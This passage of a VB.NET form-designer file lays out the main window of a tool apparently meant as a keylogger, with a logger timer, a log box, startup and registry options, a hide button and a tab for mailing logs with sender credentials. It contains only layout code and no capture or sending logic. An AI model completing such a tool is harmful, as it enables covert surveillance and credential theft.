        Me.picClose.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.picClose.Location = New System.Drawing.Point(454, 3)
        Me.picClose.Name = "picClose"
        Me.picClose.Size = New System.Drawing.Size(16, 17)
        Me.picClose.TabIndex = 1
        Me.picClose.TabStop = False
        '
        'StatusStrip1
        '
        Me.StatusStrip1.AutoSize = False
        Me.StatusStrip1.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(42, Byte), Integer), CType(CType(86, Byte), Integer))
        Me.StatusStrip1.Font = New System.Drawing.Font("Segoe UI", 8.0!)
        Me.StatusStrip1.ImeMode = System.Windows.Forms.ImeMode.NoControl
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.lblCopy, Me.lblLink, Me.lblDate})
        Me.StatusStrip1.LayoutStyle = System.Windows.Forms.ToolStripLayoutStyle.Flow
        Me.StatusStrip1.Location = New System.Drawing.Point(0, 311)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.Size = New System.Drawing.Size(474, 20)
        Me.StatusStrip1.SizingGrip = False
        Me.StatusStrip1.TabIndex = 2
        Me.StatusStrip1.Text = "StatusStrip1"
        '
        'lblCopy
        '
        Me.lblCopy.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None
        Me.lblCopy.Margin = New System.Windows.Forms.Padding(12, 2, 0, 3)
        Me.lblCopy.Name = "lblCopy"
        Me.lblCopy.Size = New System.Drawing.Size(93, 13)
        Me.lblCopy.Text = "Copyright c 2020"
        '
        'lblLink
        '
        Me.lblLink.IsLink = True
        Me.lblLink.LinkBehavior = System.Windows.Forms.LinkBehavior.NeverUnderline
        Me.lblLink.LinkColor = System.Drawing.Color.WhiteSmoke
        Me.lblLink.Margin = New System.Windows.Forms.Padding(97, 2, 0, 3)
        Me.lblLink.Name = "lblLink"
        Me.lblLink.Size = New System.Drawing.Size(91, 13)
        Me.lblLink.Text = "www.tylexit.com"
        Me.lblLink.VisitedLinkColor = System.Drawing.Color.FromArgb(CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer))
        '
        'lblDate
        '
        Me.lblDate.Font = New System.Drawing.Font("Lucida Fax", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblDate.ForeColor = System.Drawing.Color.SeaShell
        Me.lblDate.Margin = New System.Windows.Forms.Padding(105, 3, -1, 3)
        Me.lblDate.Name = "lblDate"
        Me.lblDate.Size = New System.Drawing.Size(38, 14)
        Me.lblDate.Text = "Time"
        '
        'timeLogger
        '
        '
        'NotifyIcon1
        '
        Me.NotifyIcon1.BalloonTipIcon = System.Windows.Forms.ToolTipIcon.Info
        Me.NotifyIcon1.Icon = CType(resources.GetObject("NotifyIcon1.Icon"), System.Drawing.Icon)
        Me.NotifyIcon1.Text = "Tylexit Let's Rock"
        '
        'timeMail
        '
        '
        'timeLog
        '
        '
        'timeKususJam
        '
        Me.timeKususJam.Enabled = True
        Me.timeKususJam.Interval = 1
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(274, 114)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(12, 11)
        Me.Label4.TabIndex = 13
        Me.Label4.Text = ":"
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.Location = New System.Drawing.Point(274, 92)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(12, 11)
        Me.Label8.TabIndex = 14
        Me.Label8.Text = ":"
        '
        'Label9
        '
        Me.Label9.AutoSize = True
        Me.Label9.Location = New System.Drawing.Point(274, 68)
        Me.Label9.Name = "Label9"
        Me.Label9.Size = New System.Drawing.Size(12, 11)
        Me.Label9.TabIndex = 15
        Me.Label9.Text = ":"
        '
        'Main_Menu
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(39, Byte), Integer), CType(CType(46, Byte), Integer))
        Me.ClientSize = New System.Drawing.Size(474, 331)
        Me.ControlBox = False
        Me.Controls.Add(Me.StatusStrip1)
        Me.Controls.Add(Me.Panel1)
        Me.Controls.Add(Me.tabBoxControl)
        Me.ForeColor = System.Drawing.Color.White
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.ImeMode = System.Windows.Forms.ImeMode.[On]
        Me.KeyPreview = True
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Main_Menu"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Main_Menu"
        Me.tabBoxControl.ResumeLayout(False)
        Me.tabMaster.ResumeLayout(False)
        Me.groupPanel.ResumeLayout(False)
        Me.groupPanel.PerformLayout()
        Me.tabMail.ResumeLayout(False)
        Me.tabMail.PerformLayout()
        Me.tabAbout.ResumeLayout(False)
        Me.tabAbout.PerformLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.Panel1.ResumeLayout(False)
        Me.Panel1.PerformLayout()
        CType(Me.picMin, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.picClose, System.ComponentModel.ISupportInitialize).EndInit()
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents tabBoxControl As System.Windows.Forms.TabControl
    Friend WithEvents tabMaster As System.Windows.Forms.TabPage
    Friend WithEvents Panel1 As System.Windows.Forms.Panel
    Friend WithEvents picClose As System.Windows.Forms.PictureBox
    Friend WithEvents tabAbout As System.Windows.Forms.TabPage
    Friend WithEvents StatusStrip1 As System.Windows.Forms.StatusStrip
    Friend WithEvents lblFormTitle As System.Windows.Forms.Label
    Friend WithEvents btnStart As System.Windows.Forms.Button
    Friend WithEvents groupPanel As System.Windows.Forms.GroupBox
    Friend WithEvents cekCmd As System.Windows.Forms.CheckBox
    Friend WithEvents cekTask As System.Windows.Forms.CheckBox
    Friend WithEvents cekStartup As System.Windows.Forms.CheckBox
    Friend WithEvents btnStop As System.Windows.Forms.Button
    Friend WithEvents btnClear As System.Windows.Forms.Button
    Friend WithEvents btnSave As System.Windows.Forms.Button
    Friend WithEvents timeLogger As System.Windows.Forms.Timer
    Friend WithEvents saveBox As System.Windows.Forms.SaveFileDialog
    Friend WithEvents richLogBox As System.Windows.Forms.RichTextBox
    Friend WithEvents NotifyIcon1 As System.Windows.Forms.NotifyIcon
    Friend WithEvents cekRegedit As System.Windows.Forms.CheckBox
    Friend WithEvents picMin As System.Windows.Forms.PictureBox
    Friend WithEvents btnHide As System.Windows.Forms.Button
    Friend WithEvents lblCopy As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents lblLink As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents lblDate As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents timeMail As System.Windows.Forms.Timer
    Friend WithEvents timeLog As System.Windows.Forms.Timer
    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
    Friend WithEvents Label7 As System.Windows.Forms.Label
    Friend WithEvents Label6 As System.Windows.Forms.Label
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents LinkLabel3 As System.Windows.Forms.LinkLabel
    Friend WithEvents tabMail As System.Windows.Forms.TabPage
    Friend WithEvents lblStatus As System.Windows.Forms.Label
    Friend WithEvents lblMailActive As System.Windows.Forms.Label
    Friend WithEvents btnDisable As System.Windows.Forms.Button
    Friend WithEvents btnEnable As System.Windows.Forms.Button
    Friend WithEvents lblReceiver As System.Windows.Forms.Label
    Friend WithEvents txtReceiver As System.Windows.Forms.TextBox
    Friend WithEvents btnMail As System.Windows.Forms.Button
    Friend WithEvents lblSenderPass As System.Windows.Forms.Label
    Friend WithEvents lblSender As System.Windows.Forms.Label
    Friend WithEvents txtPassword As System.Windows.Forms.TextBox
    Friend WithEvents txtEmail As System.Windows.Forms.TextBox
    Friend WithEvents timeKususJam As System.Windows.Forms.Timer
    Friend WithEvents btnDonate As System.Windows.Forms.Button
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents Label9 As System.Windows.Forms.Label
    Friend WithEvents Label8 As System.Windows.Forms.Label
End Class
